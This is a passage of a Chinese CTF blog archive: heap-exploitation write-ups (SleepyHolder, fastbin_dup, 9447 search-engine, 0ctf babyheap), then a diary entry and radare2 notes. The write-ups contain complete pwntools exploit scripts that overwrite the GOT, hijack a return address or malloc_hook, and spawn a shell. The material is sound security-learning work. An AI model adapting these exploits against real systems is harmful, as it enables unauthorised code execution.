//选择123来使用calloc分别分配大小为40,4000,400000大小的chunk且都只能分配一块，12的chunk可以wipe或者renew，3的chunk分配就再也没法变了。inuse位会被标记为1. break; &#125; &#125;&#125; 思路假设三个chunk分别为chunk0,1,2; 首先使用malloc_consolidate()，将chunk0 double free，进入unsortedbin，这个时候再申请chunk0，会将其从fastbin中取下，且inuse位被标记为1. 之后使用unlink，伪造在chunk0中，free chunk1，fake chunk便会被free进入chunklist。 通过覆盖堆指针，将free_got覆写为puts_plt，泄露出atoi_got的地址，从而计算出libc的基址。 算出system的地址，并将其写入free_got，调用free便可以getshell。 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384# -*- coding:utf-8 -*-from pwn import *context.log_level = &apos;debug&apos;context.terminal = [&apos;gnome-terminal&apos;, &apos;-x&apos;, &apos;sh&apos;, &apos;-c&apos;]p = process(&apos;./SleepyHolder&apos;)elf = ELF(&apos;./SleepyHolder&apos;)libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;) //ldd ./SleepyHolderdef add(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;1&apos;) p.recvuntil(&apos;\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content) def delete(index): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;2&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.send(str(index))def update(index, content): p.recvuntil(&apos;3. Renew secret\\n&apos;) p.sendline(&apos;3&apos;) p.recvuntil(&apos;2. Big secret\\n&apos;) p.sendline(str(index)) p.recvuntil(&apos;secret: \\n&apos;) p.send(content)#分配chunk1 chunk2add(1, &apos;a&apos;*0x10)add(2, &apos;b&apos;*0x10)#释放chunk1delete(1)#分配chunk3，让chunk1被移动到unsorted bin，使chunk2的inuse位变为0add(3, &apos;c&apos;*0x10)#这时再释放chunk1，让chunk1重新进入fast bindelete(1)heap_ptr = 0x6020d0 #堆指针#准备unlink，在chunk1中伪造chunkpayload = p64(0) + p64(0x21)payload += p64(heap_ptr - 0x18) + p64(heap_ptr - 0x10)payload += p64(0x20)#因为内存复用，这里设置chunk2的prev_sizeadd(1, payload)#此时chunk2的inuse位是0，所以触发unlinkdelete(2)free_got = elf.got[&apos;free&apos;]atoi_got = elf.got[&apos;atoi&apos;]puts_got = elf.got[&apos;puts&apos;]puts = elf.symbols[&apos;puts&apos;]system_off = libc.symbols[&apos;system&apos;]atoi_off = libc.symbols[&apos;atoi&apos;]#unlink后 堆指针被修改，向现在指针所指内存写入数据#将chunk2指针覆盖为atoi_got#将chunk3指针覆盖为puts_got#将chunk1指针覆盖为free_gotpayload = p64(0) + p64(atoi_got)payload += p64(puts_got) + p64(free_got)update(1, payload)#再次向chunk1写入，相当于向free_got写入#这里将free_got写为putsupdate(1, p64(puts))#删除chunk2，但是free的got表已经被写为puts，所以这里实际调用puts(chunk2)#因为chunk2指针被覆盖为atoi_got，所以输出的是atoi的实际地址#由此可计算出libc_basedelete(2)libc_base = u64(p.recv(6) + &apos;\\x00\\x00&apos;) - atoi_off#通过调试发现，这里只能取6个字节print &quot;libc_base : %#x&quot; % libc_base system = libc_base + system_off#将free的got表写为systemupdate(1, p64(system))#向chunk2中写入binsh 释放chunk2时 chunk2的内容会作为参数add(2, &apos;/bin/sh\\x00&apos;)delete(2)p.interactive()","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Introduction to pwn2.1-fastbin_dup","slug":"introduction-to-pwn2-1-fastbin-dup","date":"2018-10-15T11:14:55.000Z","updated":"2019-02-19T06:14:51.320Z","comments":true,"path":"2018/10/15/introduction-to-pwn2-1-fastbin-dup/","link":"","permalink":"http://siriuswhiter.tk/2018/10/15/introduction-to-pwn2-1-fastbin-dup/","excerpt":"","text":"尽量去有秩序的入门堆。。。但大部分堆看起来都太痛苦了。。 fastbin_dup原理利用堆对fastbin的管理特性，当chunk在fastbin的表头时，再次释放会触发检测机制，防止double free，但是若不在表头，便不会有这个问题。产生这种结果的原因是： fastbin 在执行 free 的时候仅验证了 main_arena 直接指向的块，即链表指针头部的块。对于链表后面的块，并没有进行验证。 可以用how2heap的例子来理解： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;int main()&#123; fprintf(stderr, &quot;This file extends on fastbin_dup.c by tricking malloc into\\n&quot; &quot;returning a pointer to a controlled location (in this case, the stack).\\n&quot;); unsigned long long stack_var; fprintf(stderr, &quot;The address we want malloc() to return is %p.\\n&quot;, 8+(char *)&amp;stack_var); fprintf(stderr, &quot;Allocating 3 buffers.\\n&quot;); int *a = malloc(8); int *b = malloc(8); int *c = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, a); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, b); fprintf(stderr, &quot;3rd malloc(8): %p\\n&quot;, c); fprintf(stderr, &quot;Freeing the first one...\\n&quot;); free(a); fprintf(stderr, &quot;If we free %p again, things will crash because %p is at the top of the free list.\\n&quot;, a, a); // free(a); fprintf(stderr, &quot;So, instead, we&apos;ll free %p.\\n&quot;, b); free(b); fprintf(stderr, &quot;Now, we can free %p again, since it&apos;s not the head of the free list.\\n&quot;, a); free(a); fprintf(stderr, &quot;Now the free list has [ %p, %p, %p ]. &quot; &quot;We&apos;ll now carry out our attack by modifying data at %p.\\n&quot;, a, b, a, a); unsigned long long *d = malloc(8); fprintf(stderr, &quot;1st malloc(8): %p\\n&quot;, d); fprintf(stderr, &quot;2nd malloc(8): %p\\n&quot;, malloc(8)); fprintf(stderr, &quot;Now the free list has [ %p ].\\n&quot;, a); fprintf(stderr, &quot;Now, we have access to %p while it remains at the head of the free list.\\n&quot; &quot;so now we are writing a fake free size (in this case, 0x20) to the stack,\\n&quot; &quot;so that malloc will think there is a free chunk there and agree to\\n&quot; &quot;return a pointer to it.\\n&quot;, a); stack_var = 0x20; fprintf(stderr, &quot;Now, we overwrite the first 8 bytes of the data at %p to point right before the 0x20.\\n&quot;, a); *d = (unsigned long long) (((char*)&amp;stack_var) - sizeof(d)); fprintf(stderr, &quot;3rd malloc(8): %p, putting the stack address on the free list\\n&quot;, malloc(8)); fprintf(stderr, &quot;4th malloc(8): %p\\n&quot;, malloc(8));&#125; 运行结果为： 1234567891011121314151617181920212223 ./fastbin_dup_into_stack This file extends on fastbin_dup.c by tricking malloc intoreturning a pointer to a controlled location (in this case, the stack).The address we want malloc() to return is 0x7ffe1abfa870.Allocating 3 buffers.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e2803rd malloc(8): 0x56317e17e2a0Freeing the first one...If we free 0x56317e17e260 again, things will crash because 0x56317e17e260 is at the top of the free list.So, instead, we&apos;ll free 0x56317e17e280.Now, we can free 0x56317e17e260 again, since it&apos;s not the head of the free list.Now the free list has [ 0x56317e17e260, 0x56317e17e280, 0x56317e17e260 ]. We&apos;ll now carry out our attack by modifying data at 0x56317e17e260.1st malloc(8): 0x56317e17e2602nd malloc(8): 0x56317e17e280Now the free list has [ 0x56317e17e260 ].Now, we have access to 0x56317e17e260 while it remains at the head of the free list.so now we are writing a fake free size (in this case, 0x20) to the stack,so that malloc will think there is a free chunk there and agree toreturn a pointer to it.Now, we overwrite the first 8 bytes of the data at 0x56317e17e260 to point right before the 0x20.3rd malloc(8): 0x56317e17e260, putting the stack address on the free list4th malloc(8): 0x7ffe1abfa860 可以看出1st malloc分配的内存被分配了两次，这样就可以修改其fd指针来控制分配的chunk的位置，例如chunk4就被分配到了栈里。 例题-9447-search-engine条件程序给出了三个选项。2可以输入一个自己指定长度的句子，然后可以用1来索引2中句子的单词，索引到之后可以选择是否删除该句子。 123456int menu()&#123; puts(&quot;1: Search with a word&quot;); puts(&quot;2: Index a sentence&quot;); return puts(&quot;3: Quit&quot;);&#125; inde a sentence.程序写的很复杂，看起来很揪心。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768int index_a_sentence()&#123; int v0; // eax __int64 v1; // rbp int v2; // er13 char *v3; // r12 signed __int64 v4; // rbx signed __int64 v5; // rbp _DWORD *v6; // rax int v7; // edx __int64 v8; // rdx __int64 v10; // rdx puts(&quot;Enter the sentence size:&quot;); v0 = get_num(); v1 = (unsigned int)(v0 - 1); v2 = v0; if ( (unsigned int)v1 &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the sentence:&quot;); v3 = (char *)malloc(v2); read_until_newline((__int64)v3, v2, 0); v4 = (signed __int64)(v3 + 1); v5 = (signed __int64)&amp;v3[v1 + 2]; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v3; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; do &#123; while ( *(_BYTE *)(v4 - 1) != 32 ) &#123; v6[2] = ++v7;LABEL_4: if ( ++v4 == v5 ) goto LABEL_8; &#125; if ( v7 ) &#123; v10 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v10; v6 = malloc(0x28uLL); v7 = 0; *(_QWORD *)v6 = v4; v6[2] = 0; *((_QWORD *)v6 + 2) = v3; v6[6] = v2; goto LABEL_4; &#125; *(_QWORD *)v6 = v4++; &#125; while ( v4 != v5 );LABEL_8: if ( v7 ) &#123; v8 = qword_6020B8; qword_6020B8 = (__int64)v6; *((_QWORD *)v6 + 4) = v8; &#125; else &#123; free(v6); &#125; return puts(&quot;Added sentence&quot;);&#125; search word： 123456789101112131415161718192021222324252627282930313233343536void search_with_a_word()&#123; int v0; // ebp void *v1; // r12 __int64 i; // rbx char v3; // [rsp+0h] [rbp-38h] puts(&quot;Enter the word size:&quot;); v0 = get_num(); if ( (unsigned int)(v0 - 1) &gt; 0xFFFD ) puts_(&quot;Invalid size&quot;); puts(&quot;Enter the word:&quot;); v1 = malloc(v0); read_until_newline((__int64)v1, v0, 0); for ( i = qword_6020B8; i; i = *(_QWORD *)(i + 32) ) &#123; if ( **(_BYTE **)(i + 16) ) &#123; if ( *(_DWORD *)(i + 8) == v0 &amp;&amp; !memcmp(*(const void **)i, v1, v0) ) &#123; __printf_chk(1LL, &quot;Found %d: &quot;, *(unsigned int *)(i + 24)); fwrite(*(const void **)(i + 16), 1uLL, *(signed int *)(i + 24), stdout); putchar(10); puts(&quot;Delete this sentence (y/n)?&quot;); read_until_newline((__int64)&amp;v3, 2, 1); if ( v3 == 121 ) &#123; memset(*(void **)(i + 16), 0, *(signed int *)(i + 24)); free(*(void **)(i + 16)); puts(&quot;Deleted!&quot;); &#125; &#125; &#125; &#125; free(v1);&#125; get_num： 123456789101112131415161718__int64 get_num()&#123; __int64 result; // rax char *endptr; // [rsp+8h] [rbp-50h] char nptr; // [rsp+10h] [rbp-48h] unsigned __int64 v3; // [rsp+48h] [rbp-10h] v3 = __readfsqword(0x28u); read_until_newline((__int64)&amp;nptr, 48, 1); result = strtol(&amp;nptr, &amp;endptr, 0); if ( endptr == &amp;nptr ) &#123; __printf_chk(1LL, &quot;%s is not a valid number\\n&quot;, &amp;nptr); result = get_num(); &#125; __readfsqword(0x28u); return result;&#125; 分析get_num这个函数本身有漏洞，它将输入的最大48位字符串转化为数字，但是问题就是在确定字符串时是以结尾的null来判断的，所以我们如果输入48个字符的话，在报错时可能会将之后的栈内存打印出来从而泄露栈地址。 整个过程大概是以一个结构体来保存每个单词：(40个字节) 12345678struct words_struct &#123; addr* words_str; //单词字符串的起始位置(其实是在句子字符串当中的) int64_t size; // 单词大小 addr* ptr_to_sentences; //单词所在的句子字符串的位置 int64_t* size_of_sentences;//句子长度 words_struct* next_word;//链表下一个节点指针 &#125;; 在删除句子时，是将word_struct中ptr_to_sentences所指向的句子释放，但未置为null。在每次释放 i-&gt;sentence_ptr 之前，这个句子的内容就会全部被设置为 \\x00 ，由于单词结构体中存储的单词只是句子的一个指针，所以单词也会被置为 \\x00 。该句子对应的那些单词仍然是存在于链表中的，并没有被删除，因此每次搜索单词的时候，仍然会判断。看起来由于句子内容被置为 \\x00 可以防止通过 *i-&gt;sentence_ptr 验证。然而，由于 chunk 被释放后会被放到 bin 中，当 chunk 不是 fastbin 或者 chunk 被重新分配出去使用的时候，也就有可能会产生 double free 的情况。此外，当句子被 memset 的时候，单词虽然都变为了 \\x00 ，但是我们仍然可以通过两个 \\x00 的比较来绕过 memcmp 的检测。 利用思路1) 利用get_num函数的漏洞试图泄露栈地址2) 泄露libc_address，从而计算出system 和 /bin/sh的地址3) 利用fastbin_dup 进行double free4) 利用double free来覆盖栈中的返回地址控制程序执行system(“/bin/sh”) 思路大抵如此，但是借鉴大佬的exp却都无法正常得到shell，不晓得哪里有问题，或许是环境不一样 exp先附上大佬写的exp，再多捋一捋思路，调试调试，去找到问题。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141#!/usr/bin/env python2from pwn import *context(arch=&quot;amd64&quot;, os=&quot;linux&quot;)p = process(&apos;./search-bf61fbb8fa7212c814b2607a81a84adf&apos;)# binsh_offset 找不到pop_rdi_ret = 0x400e23system_offset = 0x46590puts_offset = 0x6fd60binsh_offset = 1558723def leak_stack(): p.sendline(&apos;A&apos;*48) p.recvuntil(&apos;Quit\\n&apos;) p.recvline() # doesn&apos;t work all the time p.sendline(&apos;A&apos;*48) leak = p.recvline().split(&apos; &apos;)[0][48:] return int(leak[::-1].encode(&apos;hex&apos;), 16)def leak_libc(): # this sentence is the same size as a list node index_sentence((&apos;a&apos;*12 + &apos; b &apos;).ljust(40, &apos;c&apos;)) # delete the sentence search(&apos;a&apos; * 12) p.sendline(&apos;y&apos;) # the node for this sentence gets put in the previous sentence&apos;s spot. # note we made sure this doesn&apos;t reuse the chunk that was just freed by # making it 64 bytes index_sentence(&apos;d&apos; * 64) # free the first sentence again so we can allocate something on top of it. # this will work because 1) the sentence no longer starts with a null byte # (in fact, it should be clear that it starts a pointer to 64 d&apos;s), and 2) # the location where our original string contained `b` is guaranteed to be # zero. this is because after the original sentence was zeroed out, nothing # was allocated at offset 12, which is just padding in the structure. if # we had made the first word in the string 16 bytes instead of 12, then that # would put &apos;b&apos; at a location where it would not be guaranteed to be zero. search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) # make our fake node node = &apos;&apos; node += p64(0x400E90) # word pointer &quot;Enter&quot; node += p64(5) # word length node += p64(0x602028) # sentence pointer (GOT address of free) node += p64(64) # length of sentence node += p64(0x00000000) # next pointer is null assert len(node) == 40 # this sentence gets allocated on top of the previous sentence&apos;s node. # we can thus control the sentence pointer of that node and leak memory. index_sentence(node) # this simply receives all input from the binary and discards it, which # makes parsing out the leaked address easier below. p.clean() # leak the libc address search(&apos;Enter&apos;) p.recvuntil(&apos;Found 64: &apos;) leak = u64(p.recvline()[:8]) p.sendline(&apos;n&apos;) # deleting it isn&apos;t necessary return leakdef index_sentence(s): p.sendline(&apos;2&apos;) p.sendline(str(len(s))) p.sendline(s)def search(s): p.sendline(&apos;1&apos;) p.sendline(str(len(s))) p.sendline(s)def make_cycle(): index_sentence(&apos;a&apos;*54 + &apos; d&apos;) index_sentence(&apos;b&apos;*54 + &apos; d&apos;) index_sentence(&apos;c&apos;*54 + &apos; d&apos;) search(&apos;d&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;y&apos;) search(&apos;\\x00&apos;) p.sendline(&apos;y&apos;) p.sendline(&apos;n&apos;)def make_fake_chunk(addr): # set the fwd pointer of the chunk to the address we want fake_chunk = p64(addr) index_sentence(fake_chunk.ljust(56))def allocate_fake_chunk(binsh_addr, system_addr): # allocate twice to get our fake chunk index_sentence(&apos;A&apos;*56) index_sentence(&apos;B&apos;*56) # overwrite the return address buf = &apos;A&apos;*30 buf += p64(pop_rdi_ret) buf += p64(binsh_addr) buf += p64(system_addr) buf = buf.ljust(56, &apos;C&apos;) index_sentence(buf)def main(): stack_leak = leak_stack() # This makes stack_addr + 0x8 be 0x40 //在泄露的栈地址附近寻找0x40用于充当fakechunk的size stack_addr = stack_leak + 0x5a - 8 log.info(&apos;stack leak: %s&apos; % hex(stack_leak)) log.info(&apos;stack addr: %s&apos; % hex(stack_addr)) libc_leak = leak_libc() libc_base = libc_leak - puts_offset system_addr = libc_base + system_offset binsh_addr = libc_base + binsh_offset log.info(&apos;libc leak: %s&apos; % hex(libc_leak)) log.info(&apos;libc_base: %s&apos; % hex(libc_base)) log.info(&apos;system addr: %s&apos; % hex(system_addr)) log.info(&apos;binsh addr: %s&apos; % hex(binsh_addr)) make_cycle() make_fake_chunk(stack_addr) allocate_fake_chunk(binsh_addr, system_addr) p.interactive()if __name__ == &apos;__main__&apos;: main() 例题-0ctfbabyheap条件炒鸡正规的条件选项题： 12345678./0ctfbabyheap ===== Baby Heap in 2017 =====1. Allocate2. Fill3. Free4. Dump5. ExitCommand: 分配的块可以分析出有一个结构体： 12345 struc_4 structure&#123; 00000000 inuse 00000001 size 00000002 ptr 00000003 &#125;struc_4 ends inuse可以标记块的释放与否，size记录大小，ptr指向分配的内存地址； 各个选项就不一一列举了，每个选项就如它名字一般：allocate使用calloc分配块，最大4096；fill填充用户指定allocate分配的块及新的size，所以很明显可以覆盖指针云云；free将inuse变为0，size归零，free掉指针，但是并未将其指向null；但是因为allocate时使用的是calloc将原空间置零，所以无法UAF。dump检测完inuse位，之后可以将size大小的ptr指向的地址的内容打印出来。 分析即使这个程序的漏洞这么明显，还是不知道怎么下手，满脑子unlink？？不过鉴于这是fastbin_dup处的学习，学学大佬们的思路。 目标：1.leak libc地址 2.利用fastbin_dup将chunk分配到malloc_hook处（malloc_hook 是一个 libc 上的函数指针，调用 malloc 时如果该指针不为空则执行它指向的函数，可以通过写 malloc_hook 来 getshell） 1234567891011gdb-peda$ x/20gx (long long)(&amp;main_arena)-0x300x7fa3a2008c10 &lt;_IO_wide_data_0+304&gt;: 0x00007fa3a2004d60 0x00000000000000000x7fa3a2008c20 &lt;__memalign_hook&gt;: 0x00007fa3a1ed4bf0 0x00007fa3a1ed51600x7fa3a2008c30 &lt;__malloc_hook&gt;: 0x0000000000000000 0x0000000000000000 &lt;-- malloc hook 0x7fa3a2008c40 &lt;main_arena&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c50 &lt;main_arena+16&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c60 &lt;main_arena+32&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c70 &lt;main_arena+48&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c80 &lt;main_arena+64&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008c90 &lt;main_arena+80&gt;: 0x0000000000000000 0x00000000000000000x7fa3a2008ca0 &lt;main_arena+96&gt;: 0x000055b863881360 0x0000000000000000 exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980from pwn import *context.log_level = &apos;debug&apos;sh = process(&apos;./0ctfbabyheap&apos;)ENV = &#123;&quot;LD_PRELOAD&quot;:&quot;./libc.so.6&quot;&#125;def allocate(size): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;1&quot;) sh.recvuntil(&apos;Size: &apos;) sh.sendline(str(size))def fill(index,content): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;2&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index)) sh.recvuntil(&apos;Size: &apos;) sh.sendline(str(len(content))) sh.recvuntil(&apos;Content: &apos;) sh.sendline(content)def free(index): sh.recvuntil(&apos;Command: &apos;) sh.sendline(&quot;3&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index))def dump(index): sh.recvuntil(&quot;Command: &quot;) sh.sendline(&quot;4&quot;) sh.recvuntil(&apos;Index: &apos;) sh.sendline(str(index))#--------- allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x10)allocate(0x80)#----------leak libc base-----------free(2)free(1)fill(0,&apos;a&apos;*0x10+p64(0)+p64(0x21)+p8(0x80))fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x21))allocate(0x10)allocate(0x10)fill(3,&apos;d&apos;*0x10+p64(0)+p64(0x91))allocate(0x80)free(4)dump(2)sh.recvuntil(&apos;Content: \\n&apos;)leak_addr = u64(sh.recv(8))main_arena = leak_addr - 88libc_base = main_arena - 0x3c4b20print &apos;main_arena: &apos;+hex(main_arena)print &apos;libc_base: &apos;+hex(libc_base)#gdb.attach(sh)#------------hjack malloc_hook --------one_gadget_off = 0x4526aone_gadget_addr = libc_base + one_gadget_offprint &apos;one_gadget_addr: &apos;+hex(one_gadget_addr)allocate(0x60)free(4)fill(2,p64(main_arena - 0x33))allocate(0x60)allocate(0x60)fill(6,&apos;a&apos;*0x13+p64(one_gadget_addr))#gdb.attach(sh)allocate(0x100)sh.interactive() reference:https://blog.csdn.net/qq_35519254/article/details/78213962?utm_source=blogxgwz1https://bbs.pediy.com/thread-223461.htm 没有人指导堆的学习，日常入门到入土，太难受了。主要是前天打比赛结果很惨烈，希望能加把劲把基础的堆问题给解决掉，下次比赛尽量能够解决一些堆的题。","categories":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/categories/pwn/"}],"tags":[{"name":"pwn","slug":"pwn","permalink":"http://siriuswhiter.tk/tags/pwn/"},{"name":"heap","slug":"heap","permalink":"http://siriuswhiter.tk/tags/heap/"}]},{"title":"Diary.20181008","slug":"diary-20181008","date":"2018-10-08T13:10:48.000Z","updated":"2018-10-15T12:17:30.737Z","comments":true,"path":"2018/10/08/diary-20181008/","link":"","permalink":"http://siriuswhiter.tk/2018/10/08/diary-20181008/","excerpt":"","text":"下午摸了一道题，比较简单的格式化字符串；之后摸手机端的 termux ，试图在上面安装 nmap，metasploit；nmap还是很顺利的，但是metasploit搞到自闭……各种安装包问题，一步一步的找问题找解决方法才好不容易把解决；黑域brevent也搞了半天，最后我还是选择绿色守护……手机最近掉电掉的有点严重，必须管一管了；配合帅气的termux，搞了个hacker’s keyboard ，打起字来方便了不少， 还换了个hacker live wallpaper，也就是像是黑客帝国那样的动态壁纸，hhhh整个手机炫酷了不少。周四林少华老师要来学校做客震旦讲堂！！！一定要过去，顺便看能不能混个签名hhh …搞了半天特定文章的加密，反而全都无法通过，搞不懂怎么回事…真麻烦 12345678910&lt;script&gt; (function()&#123; if(&apos;&#123;&#123; page.password&#125;&#125;&apos; !== 0)&#123; if (prompt(&apos;PASSWORD&apos;) !== &apos;&#123;&#123; page.password &#125;&#125;&apos;)&#123; alert(&apos;Wrong！&apos;); history.back(); &#125; &#125; &#125;)();&lt;/script&gt; 上面这个运用js的alert阻断机制，但是会把我所有文章都加密。。这下好了，越来越糟糕 hexo-blog-encrypt 这个组件都不能用。。没办法了","categories":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/categories/diary/"}],"tags":[{"name":"diary","slug":"diary","permalink":"http://siriuswhiter.tk/tags/diary/"}]},{"title":"Radare2","slug":"radare2","date":"2018-09-25T02:56:08.000Z","updated":"2019-02-15T04:58:55.616Z","comments":true,"path":"2018/09/25/radare2/","link":"","permalink":"http://siriuswhiter.tk/2018/09/25/radare2/","excerpt":"","text":"之前听闻学长说许多大佬都用这个工具？(雾；就没事来瞎搞一搞这个可以用来逆向或pwn的神器？感觉还是很帅的hhhh，就是用起来有点emmm 安装git clone r2仓库即可，尽量每天使用前 ./sys/install.sh 更新一下 123$ git clone https://github.com/radare/radare2.git$ cd radare2$ ./sys/install.sh 使用之后学习使用中逐渐更新常用包含工具： radare2-&gt;整合了所有工具 rabin2-&gt;查看文件格式的 radiff2-&gt;比较文件不同的 rahash2-&gt;各种密码算法，hash算法集成 rasm2-&gt;汇编和反汇编 ragg2-&gt;开发shellcode工具(radare2自己编写的编译器) radare2随便加载个文件,会有一句欢迎语hhhh 123$r2 pwnme -- We only have bugs, features are an unintended side-effect[0x08049090]&gt; //工具找到的入口位置 rabin2查看文件基本信息 123456789101112131415161718192021222324252627282930# rabin2 -I pwnmearch x86baddr 0x8048000binsz 14275bintype elfbits 32canary falsesanitiz falseclass ELF32crypto falseendian littlehavecode trueintrp /lib/ld-linux.so.2lang clinenum truelsyms truemachine Intel 80386maxopsz 16minopsz 1nx trueos linuxpcalign 0pic falserelocs truerelro partialrpath NONEstatic falsestripped falsesubsys linuxva true rahash2支持超多加解密 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263# rahash2 -L //列举Available Hashes: h md5h sha1h sha256h sha384h sha512h md4h xorh xorpairh parityh entropyh hamdisth pcprinth mod255h xxhashh adler32h luhnh crc8smbush crc15canh crc16h crc16hdlch crc16usbh crc16citth crc24h crc32h crc32ch crc32ecma267h crc32bzip2h crc32dh crc32mpeg2h crc32posixh crc32qh crc32jamcrch crc32xferh crc64h crc64ecmah crc64weh crc64xzh crc64isoAvailable Encoders/Decoders: e base64e base91e punycodeAvailable Crypto Algos: c rc2c rc4c rc6c aes-ecbc aes-cbcc rorc rolc rotc blowfishc cps2c des-ecbc xorc serpent-ecb# rahash2 -a md5 ./pwnme //生成md5哈希./pwnme: 0x00000000-0x00003c73 md5: 2569b37607fc52065f5b4e7c349d0e56 rasm2支持汇编反汇编 ragg2据说可以用来快速开发shellcode？ radiff2支持二进制文件的字节级或增量差异对比，查找基本代码块中的更改。 厂商更新漏洞时，可以寻找更新代码字段，说不定在那里还有希望挖到其他洞 rafind2在文件中查找字节模式 rarun2用于在不同环境中运行程序的启动器，具有不同的参数，权限，目录和 覆盖的默认文件描述符。 rarun2可用于： * 破解小程序 * 模糊测试 * 测试组件 rax2用于shell的简约数学表达式求值器，用于在浮点值，十六进制表示， 十六进制字符串到ASCII之间进行基本转换，八进制到整数等。 它还支持字节顺序设置，如果没有参数，可以用作交互式shell 给出。 常用命令 i 开头的命令主要是用来获取各种信息。iz – 列出数据段里的字符串 1234567891011[0x08049090]&gt; ie[Entrypoints]vaddr=0x08049090 paddr=0x00001090 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints[0x08049090]&gt; iz[Strings]Num Vaddr Paddr Len Size Section Type String000 0x00002008 0x0804a008 7 8 (.rodata) ascii /bin/sh001 0x00002010 0x0804a010 5 6 (.rodata) ascii input a 开头的命令主要是用来分析文件。radare2 不会主动去分析一个文件，因为这样做的代价太大了，它需要花费很多的时间。也可以在运行 radare2的使用 -A 参数来直接分析一个文件(例如 r2 -A pwnme) 12345678# r2 -A pwnme[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze function calls (aac)[x] Analyze len bytes of instructions for references (aar)[x] Constructing a function name for fcn.* and sym.func.* functions (aan)[x] Type matching analysis for all functions (afta)[x] Use -AA or aaaa to perform additional experimental analysis. -- r2OS r2pad 0.1 SMP GENERIC r2_64 GNU/r2OS fs 分析完成之后， r2会将所有有用的信息和特定的名字绑定在一起，比如区段、函数、符号、字符串，这些都被称作 ‘flags’, flags 被整合进 ，一个 flag 是所有类似特征的集合。可以使用 ‘fs ‘ 加 ‘f’ 来打印出 这个 flags 下面包含的信息，使用分号来间隔多条命令(‘cmd1;cmd2;cmd3;…’). 1234567891011[0x08049090]&gt; fs0 2 * strings1 37 * symbols2 30 * sections3 12 * segments4 5 * relocs5 5 * imports6 2 * functions[0x08049090]&gt; fs strings;f0x0804a008 8 str.bin_sh0x0804a010 6 str.input axt 命令用来在 data/code段里找寻某个地址相关的引用（更多的操作，请看 ‘ax?’）.‘@@’就像一个迭代器，用来在地址空间里不断地匹配后面一系列相关的命令（更多操作，请看 ‘@@?’）， ‘str.*’ 是一个通配符，用来标记所有以 ‘str.’开头的信息，这个不光会列出字符串标志，同时也包括函数名，找到它们到底在哪里以及何处被调用。 vv 大概是会显示函数列表和入口处的函数？可以查看各个函数(花里胡哨的，很漂亮哦，不如我们。。) 12345678910111213141516171819202122232425-[ functions ]----------------- pdf ---(a) add (x) xrefs (q) quit (jk) next/prev ;-- section..text:(r) rename (c) calls (g) go (tab) column ;-- eip:(d) delete (v) vars (?) help (:) enter cmd / (fcn) entry0 50&gt;* 0x08049090 50 entry0 | entry0 (); 0x080490c3 4 fcn.080490c3 | 0x08049090 xor ebp, ebp ; [14] -r-x secti 0x08049070 6 sym.imp.__libc_start_main | 0x08049092 pop esi 0x080490f0 40 sym.deregister_tm_clones | 0x08049093 mov ecx, esp 0x08049130 53 sym.register_tm_clones | 0x08049095 and esp, 0xfffffff0 0x08049170 30 sym.__do_global_dtors_aux | 0x08049098 push eax 0x080491a0 2 entry1.init | 0x08049099 push esp 0x080492b0 2 sym.__libc_csu_fini | 0x0804909a push edx 0x080490e0 4 sym.__x86.get_pc_thunk.bx | 0x0804909b call fcn.080490c3 0x080492b4 20 sym._fini | 0x080490a0 add ebx, 0x2f60 ; &apos;`/&apos; 0x08049250 93 sym.__libc_csu_init | 0x080490a6 lea eax, [ebx - 0x2d50] 0x080490d0 2 sym._dl_relocate_static_pie | 0x080490ac push eax ; func fini 0x08049203 65 sym.main | 0x080490ad lea eax, [ebx - 0x2db0] 0x08049244 4 sym.__x86.get_pc_thunk.ax | 0x080490b3 push eax ; func init 0x08049050 6 sym.imp.puts | 0x080490b4 push ecx ; char **ubp_av 0x080491cd 54 sym.vulnerable | 0x080490b5 push esi ; int argc 0x08049040 6 sym.imp.gets | 0x080490b6 mov eax, sym.main ; 0x8049203 